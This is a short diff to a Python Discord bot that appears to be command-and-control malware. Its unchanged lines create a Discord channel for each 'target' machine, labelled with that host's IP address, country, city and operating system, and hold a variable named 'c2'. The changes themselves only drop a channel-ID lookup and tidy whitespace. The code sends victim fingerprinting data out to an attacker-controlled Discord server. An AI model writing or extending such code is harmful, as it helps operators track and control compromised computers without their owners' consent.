@@ -28,7 +28,6 @@ def main():
     threads = []
 
     # Guild, Bot Token input
-    channel_id = int(os.environ.get("DISCORD_CHANNEL_ID")) # should be in int type!
     token = os.environ.get("DISCORD_TOKEN") # should be in string type!
     bot = commands.Bot(command_prefix="!")
 
@@ -45,8 +44,6 @@ def main():
         if identifier not in targets_identifiers:
             channel_name = await guild.create_text_channel(identifier, topic=f"IP: {ip} | COUTRY: {country} | CITY: {city} | OS: {platform.platform()}")
             print(f"Created new channel: {channel_name}")
-            channel_id = discord.utils.get(bot.get_all_channels(), name=identifier)
-            c2 = bot.get_channel(channel_id.id)
 
     # this blob is for helping the website backend
     @bot.event
@@ -90,7 +87,7 @@ def main():
 
         # let the observer start waiting for the message
         await asyncio.sleep(1)
-        
+
         await ctx.reply('pong!')
 
     @bot.command()
